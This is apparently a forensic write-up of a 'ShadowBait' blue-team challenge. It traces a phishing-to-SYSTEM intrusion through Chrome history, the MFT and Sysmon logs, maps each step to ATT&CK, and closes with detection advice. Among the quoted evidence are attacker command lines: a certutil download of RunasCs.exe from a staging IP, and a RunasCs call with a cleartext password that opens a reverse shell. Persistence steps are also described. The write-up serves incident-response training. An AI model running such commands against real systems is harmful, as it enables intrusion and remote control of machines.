Date : 28/07/2026

.zip : `ShadowBait.zip` — SHA256 `37d2cacca0918c7047e9a8c22fc133573c062a4476368819f44b4547bbd42f57` — password : `hacktheblue`

KAPE file `Kroll Artifact Parser and Extractor` (high value copy of a Windows drive)

"Steven … downloaded a document from an external source…" — phishing → RA → DPAPI/CliXml → lateral as Samy → SYSTEM → persistence.

```bash
> 7z x -p'hacktheblue' ShadowBait.zip -oShadowBait-analysis -y
> G=~/Downloads/ShadowBait-analysis/ShadowBait/G   # treat as C:\
> SYSMON="$G/Windows/System32/winevt/logs/Microsoft-Windows-Sysmon%4Operational.evtx"
```

KAPE triage (CopyLog/ConsoleLog + `$MFT` + winevt slices) — not a full disk. Dig backwards: scenario name → browser → PS history → Prefetch → `$MFT` → Sysmon.

Initial access — Chrome

```bash
> sqlite3 -readonly "file:$G/Users/steven/AppData/Local/Google/Chrome/User Data/Default/History?immutable=1" \
    "SELECT datetime(start_time/1000000-11644473600,'unixepoch'), target_path, tab_url FROM downloads;"
```

`2025-06-07 05:38:15` → `Policy.docm` from Google Drive `…id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download`.

`ATT&CK ID : Spearphishing Link T1566.002`
`ATT&CK ID : User Execution - Malicious File T1204.002`

Stager — `$MFT`

```bash
> ntfs-parser --mft "$G/\$MFT" ~/Downloads/ShadowBait-analysis/ez-out/mft.csv
> rg -i 'downloader\.ps1' ~/Downloads/ShadowBait-analysis/ez-out/mft.csv
```

`downloader.ps1` create : `2025-06-07 05:42:11` → drops RA payload.

`ATT&CK ID : Command and Scripting Interpreter - PowerShell T1059.001`

C2 — Sysmon EID 3

```bash
> chainsaw search -q -i OpenDLL "$SYSMON"
> chainsaw search -q -i 8899 "$SYSMON"
```

Payload : `C:\users\Steven\AppData\Roaming\OpenDLL.exe` — callback port `8899`.

`ATT&CK ID : Ingress Tool Transfer T1105`
`ATT&CK ID : Application Layer Protocol T1071`

Creds — CliXml / DPAPI

PS history + file under Samy Documents. Import used:

```text
$cred = Import-CliXml -Path connection.xml
```

Path : `C:\Users\Samy\Documents\connection.xml`

`ATT&CK ID : Unsecured Credentials - Credentials In Files T1552.001`

Lateral — certutil + RunasCs

```bash
> chainsaw search -q -i RunasCs "$SYSMON"
```

Ingress:

```text
"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe
```

Exec (password in clear CommandLine — not in PS `Read-Host` history):

```text
C:\Users\samy\Documents\RunasCs.exe samy Winter2025! cmd -r 192.168.204.152:555 --bypass-uac --logon-type 8
```

`MAIN\steven` Medium → `MAIN\samy` High `cmd` → TCP `:555`.

`ATT&CK ID : Ingress Tool Transfer T1105`
`ATT&CK ID : Valid Accounts T1078`
`ATT&CK ID : Access Token Manipulation / Abuse Elevation Control T1134 / T1548`

Priv — psgetsys → winlogon

```bash
> chainsaw search -q -i psgetsys "$SYSMON"
> chainsaw search -q -i winlogon "$SYSMON"
```

Samy High cmd → `certutil … psgetsys.ps1` → PS handle to `winlogon.exe` PID `632` → `cmd` / encoded PS as `NT AUTHORITY\SYSTEM` parented by winlogon → reverse to `192.168.204.152:9006`.

`ATT&CK ID : Access Token Manipulation - Parent PID Spoofing T1134.004`
`ATT&CK ID : Command and Control - Non-Standard Port T1571`

Persistence — masquerade backdoor + Startup LNK

```bash
> chainsaw search -q -i document.pdf "$SYSMON"
> chainsaw search -q -i NetworkDiagnostics "$SYSMON"
> chainsaw search -q -i wscript.vbs "$SYSMON"
```

SYSTEM shell pulls `document.pdf.exe` into `C:\Windows\system32\document.pdf.exe` → `schtasks` `CheckSystem` onstart / SYSTEM + `HKCU\…\Run` `WMISVC` → certutil drops `C:\programdata\wscript.vbs` → `cscript` writes Startup `NetworkDiagnostics.lnk`.

`ATT&CK ID : Masquerading T1036`
`ATT&CK ID : Scheduled Task / Boot or Logon Autostart T1053 / T1547.001`
`ATT&CK ID : Boot or Logon Autostart - Shortcut Modification T1547.009`
`ATT&CK ID : Command and Scripting Interpreter - Visual Basic T1059.005`

Attack chain - SIEM + SOC view :

Steven Drive download `policy.docm` (`T1566.002`/`T1204.002`) → `downloader.ps1` @ `05:42:11` (`T1059.001`) → `OpenDLL.exe` C2 `:8899` (`T1105`/`T1071`) → `Import-CliXml connection.xml` (`T1552.001`) → certutil `RunasCs.exe` → `samy:Winter2025!` High shell `:555` (`T1078`/`T1134`) → `psgetsys.ps1` → parent-spoof `winlogon` PID `632` → SYSTEM reverse `:9006` (`T1134.004`/`T1571`) → `C:\Windows\system32\document.pdf.exe` + `NetworkDiagnostics.lnk` via `C:\programdata\wscript.vbs` (`T1036`/`T1547.009`).

**Blue Team** :

Hunt Drive `.docm` → PS download → AppData EXE + odd port. Alert `certutil -urlcache` + HTTP EXE. Alert `Import-CliXml` of foreign `connection.xml`. Alert `winlogon` spawning interactive `cmd`/encoded PS. Kill `:8899`/`:555`/`:9006` callbacks; delete `document.pdf.exe`, Startup LNK, `wscript.vbs`, task `CheckSystem`, Run `WMISVC`; rotate Samy; ban certutil URL abuse.

**Red Team** / OPSEC fails :

Password on RunasCs CommandLine (Sysmon free gift). Masquerade names still grepable (`OpenDLL`, `document.pdf.exe`, `NetworkDiagnostics`). Same staging IP for every ingress. Left `psgetsys` + VBS on disk. Parent PID spoof against winlogon is classic and logged on EID 10 + EID 1 parent fields.